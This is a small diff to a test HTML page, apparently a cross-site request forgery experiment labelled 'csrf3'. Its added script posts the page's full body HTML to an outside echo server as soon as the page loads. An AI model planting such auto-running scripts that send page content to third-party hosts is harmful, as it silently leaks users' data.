@@ -4,11 +4,13 @@
     <meta charset="utf-8">
     <script src="https://code.jquery.com/jquery-3.1.1.min.js"   integrity="sha256-hVVnYaiADRTO2PzUGmuLJr8BLUSjGIZsDYGmIJLv2b8="   crossorigin="anonymous"></script>
 	<script>
-		alert('patate');
-		$.post( "https://posttestserver.com/post.php?dir=jpm", { content: $('body').html()} );
+		$( document ).ready(function() {
+           console.log( "ready!" );
+		   $.post( "https://posttestserver.com/post.php?dir=csrf3", { content: $('body').html()} );
+	    });
 	</script>
   </head>
   <body>
-	test 2
+     <div>test 3</div>
   </body>
 </html>
